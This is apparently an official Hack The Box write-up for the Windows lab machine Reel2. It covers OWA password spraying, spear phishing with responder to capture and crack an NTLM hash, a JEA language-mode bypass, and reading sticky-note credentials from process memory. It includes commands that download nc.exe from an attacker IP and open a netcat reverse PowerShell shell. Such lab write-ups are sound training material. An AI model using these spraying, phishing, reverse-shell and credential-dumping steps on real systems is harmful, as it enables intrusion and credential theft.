@@ -1,0 +1,252 @@
+Reel2
+
+4th Mar 2021 / Document No D21.100.108
+Prepared By: MrR3boot
+Machine Creator(s): cube0x0
+Difficulty: Hard
+Classification: Official
+Synopsis
+
+Reel2 is a Hard difficulty Windows machine that features an open source Social Networking
+application, which allows us to find usernames. Outlook Web Access access can be gained by
+performing a password spraying attack the OWA endpoint. A password hash can be captured and
+cracked by performing a spear phishing attack, which allows us to gain a foothold on the server.
+Using PowerShell functions, JEA restrictions can be bypassed. Enumerating stickynotes processes
+reveals a set of credentials which can be used to move laterally. Exploiting a vulnerable JEA
+function allows us to read files as the administrator.
+
+Skills Required
+
+      Enumeration
+      Basic Knowledge of Windows
+      Scripting
+
+Skills Learned
+
+      Phishing
+      Password Cracking
+      JEA Bypass
+      Sticky Notes Enumeration
+Enumeration
+
+Let's start by running a Nmap scan.
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.210 | grep ^[0-9] | cut -d '/' -f
+   1 | tr '\n' ',' | sed s/,$//)
+   nmap -p$ports -sC -sV 10.10.10.210
+
+The scan reveals many ports open, including port 80 (HTTP), 443 (HTTPS), 5985 (WinRM) and
+8080 (HTTP). Let's browse to to the IIS (Internet Information Services) installation on port 80.
+We're presented with an access denied message. Let's browse to port 443.
+This shows the default IIS page. Let's fuzz the web server for files and folders.
+
+FFUF
+
+   git clone https://github.com/ffuf/ffuf
+   cd ffuf
+   ffuf -u https://10.10.10.210/FUZZ -w /usr/share/wordlists/dirb/common.txt
+ffuf identified that an Exchange server present and that Outlook Web Access is available at
+/owa .
+Without knowing the domain name it's impossible to bruteforce the authentication. We can use
+the SprayingToolkit to identify the domain name. Clone the repository and issue commands
+below to install it.
+
+   git clone https://github.com/byt3bl33d3r/SprayingToolkit
+   cd SprayingToolkit
+   apt install -y libxml2-dev libxslt1-dev
+   pip3 install -r requirements.txt
+We can now run the tool.
+   python3 atomizer.py owa 10.10.10.210 --recon
+
+The domain name is found to be HTB . Let's browse to port 8080 and continue our enumeration.
+This hosts a web application. Let's register and login.
+Wallstant is an open source social network application developed in PHP. Looking at trending
+PAGES , we see a few usernames.
+
+Checking the POSTS tab reveals two posts from cube and svensson .
+Reviewing the search.php source code, we see that if a request made to this page without a
+query parameter, the application will return all registered user names.
+
+   if(isset($q) AND !empty($q)){
+   ...
+   }
+   else{
+   $all_users_sql = "SELECT * FROM signup ORDER BY id DESC";
+   ...
+   if ($c_num == 1){
+
+          $follow_btn = "<span id='followUnfollow_$id_4User' style='cursor:pointer'>
+   <span class=\"unfollow_btn\" onclick=\"followUnfollow('$id_4User')\"><span
+   class=\"fa fa-check\"></span> Following</span></span>";
+   }else{
+
+          $follow_btn = "<span id='followUnfollow_$id_4User' style='cursor:pointer'>
+   <span class=\"follow_btn\" onclick=\"followUnfollow('$id_4User')\"><span
+   class=\"fa fa-plus-circle\"></span> Follow</span></span>";
+   }
+   ...
+Let's browse to /search .
+
+This is successful, and it also reveals an xampp installation. We can write a simple Python script to
+collect the list of users first and last names.
+
+   import requests
+   from bs4 import BeautifulSoup
+   r = requests.get('http://10.10.10.210:8080/search', cookies=
+   {'PHPSESSID':'<replace with session>'})
+   u = BeautifulSoup(r.text,'lxml')
+   for i in u.find_all({'a':'user_follow_box_a'}):
+
+          if '@' in i.text:
+                 print i.text.replace('@','')
+While attempting to identify valid OWA accounts, it's a good idea to try several common
+username formats in order to identify the internal naming convention. We can use a tool such as
+Username Anarchy in order to create common username permutations based on the full names.
+After saving the full names to a text file, we run the script.
+
+   ./username-anarchy --input-file usernames.txt --select-format
+   first,first.last,f.last,flast | xargs -n 1 echo HTB\\ | tr -d ' ' > unames.txt
+This creates the following list of usernames.
+   HTB\gregg
+   HTB\gregg.quimbly
+   HTB\g.quimbly
+   HTB\gquimbly
+   HTB\joseph
+   HTB\joseph.moore
+   HTB\j.moore
+   HTB\jmoore
+   HTB\teresa
+   HTB\teresa.trump
+   ...
+We recall that one of the posts in the application refers to Summer and year 2020, so it's worth
+spraying the OWA login with the password Summer2020 , as <Season><Year> is a very common
+password format.
+
+This successfully found the valid credentials HTB\s.svensson / Summer2020 .
+Foothold
+
+Let's login to the OWA.
+    Note: a Firefox addon can be used to translate the web page.
+
+This is successful but we didn't find any emails in the mailbox. As we gained access to OWA, it's
+possible to perform spear phishing attacks by sending an email to all users in the Global Address
+List (GAL). The GAL is a built-in address list that's automatically created by Exchange which
+includes every mail-enabled object in the Active Directory forest. There are multiple ways to
+dump the Global Address List.
+Using the GUI, we can click on phonebook icon on the top-right corner, and a new window opens
+that shows the list.
+Alternatively, we can use MailSniper.ps1 to dump the GAL. Let's run the below commands to
+import and dump the Global Address List.
+
+First, let's run responder. Then select all the users in the GAL, right-click and create a new email.
+   sudo responder -I tun0
+
+After sending the email, in a minute or so we receive the Net-NTLMv2 hash for the user
+htb\k.svensson .
+Save the hash to a file and let's attempt to crack it with John The Ripper or hashcat.
+   john hash --wordlist=/usr/share/wordlists/rockyou.txt
+
+The hash is cracked and the password is found to be kittycat1 . From the Nmap scan, we found
+that the Windows Remote Management service is running on the default port 5985. Let's switch
+to a Windows machine and issue commands below to obtain a PS Remoting session on the box.
+The connection was not successful, as the target server is not present in our TrustedHosts list.
+Add this by issuing below commands, and connect again.
+
+   winrm quickconfig
+   winrm set winrm/config/client '@{TrustedHosts="10.10.10.210"}'
+It is also possible to do the above step from linux. Issuing below commands will install PowerShell
+in linux.
+   sudo apt install gss-ntlmssp
+   sudo apt-get install powershell
+We can now run the below commands to obtain a PS Remoting session on the box.
+
+JEA
+We now have a foothold on the server, although we are found to be constrained by a JEA (Just
+Enough Administration) policy.
+
+Just Enough Administration is a new feature in Windows 10/Server 2016 that allows
+administrators to create granular least-privilege policies, by granting specific administrative
+privileges to users, defined by built-in and script-defined PowerShell cmdlets. This feature is
+similar to Linux capabilities, which provide a way for a program to be granted specific abilities
+that would otherwise require root access.
+By default, JEA starts a session in NoLanguage mode which restricts the execution of cmdlets,
+functions and other PowerShell language elements. However, when configuring JEA, it is also
+possible to change the language mode. Let's check the language mode of our session.
+
+It's in ConstrainedLanguage mode. The official documentation states that this mode allows all
+PowerShell scripting elements. We can break out of the JEA restriction by creating a function.
+
+This is successful and we see the output of the whoami command. We can also use a script block
+to bypass this restriction.
+Let's download nc.exe to the machine.
+
+   & { curl 10.10.14.3/nc64.exe -o
+   'C:\Windows\System32\spool\drivers\color\nc.exe'}
+
+Start a listener on port 1234 and then issue the following command to get a full shell.
+
+   & { C:\Windows\System32\spool\drivers\color\nc.exe -e powershell.exe 10.10.14.3
+   1234 }
+Privilege Escalation
+
+Enumeration of the running processes reveals that a Sticky Notes application is in use.
+
+This application is used for taking notes. The version and installation directory of the software
+can be obtained from the process ID.
+
+We see the version of the software is 0.3.0 and also the company information. Searching online
+reveals the GitHub repository of the application.
+
+Let's download the binary of same version from releases. Install the application and let's make a
+note of contents of its Local Storage directory.
+Let's create a note.
+
+On checking the folder contains again, we now see that 000003.log file has some contents
+written to it.
+Running strings on this file reveals our note information.
+
+Upload the strings64.exe binary to the machine and run strings against the same file.
+
+This reveals the JEA credentials jea_test_account : Ab!Q@vcg^%@#1 . Alternatively, we can use
+procdump to dump the memory of each stickynotes process and identify the pattern of the notes
+in order to grep for the values.
+Let's upload procdump to the box and dump the stickynotes process memory.
+   curl 10.10.14.5/procdump64.exe -o
+   C:\Windows\System32\spool\drivers\color\procdump.exe
+   Get-Process stickynotes | % { start-process
+   C:\Windows\System32\spool\drivers\color\procdump.exe -argument "/accepteula -ma
+   $($_.Id)" }
+
+We can now grep the pattern to view the notes.
+
+Attempting to login to WinRM using the obtained credentials is unsuccessful. As stated in the
+documentation, this could be due to the missing ConfigurationName parameter. When we try to
+login with a JEA registered account, we require the name of the JEA endpoint that is registered on
+the computer. Enumerating user folders we see that there are JEA configuration files present in
+the documents folder.
+The .psrc extension is a PowerShell data file that lists all the cmdlets, functions, providers, and
+external programs that are made available to connecting users. The .pssc extension is a
+PowerShell Session configuration file. Let's view the contents of PS Session configuration file.
+
+    Note: comments are removed for better readability.
+The configuration includes RunAsVirtualAccount , which indicates that the defined role
+htb\jea_test_account will have administrative capabilities. We see that the session runs in
+NoLanguage mode, which means that we can't use the earlier bypass methods.
+
+This reveals that the custom function Check-File has been defined, which will allows the
+jea_test_account user to read the plain text contents of files from either the D: drive or from
+the C:\ProgramData folder and subfolders. Assuming the JEA configuration file name is also the
+JEA policy ConfigurationName , let's try to login to WinRM.
+This is successful. Checking the available functions, we do indeed see Check-File is available to
+this user.
+
+Let's see if we can perform a path traversal attack using this function.
+
+This is successful. Alternatively we can create a NTFS Junction Point to the
+C:\users\Adminsitrator folder in C:\programdata . Let's open another PowerShell window
+and issue command below from the htb\k.svensson session in order to create a junction.
+
+   & { New-Item -ItemType Junction -Path "C:\programdata\admin" -Target
+   "C:\users\administrator" }
+We can now switch back to the jea_test_account session and read root.txt from the
+Administrator desktop.
+
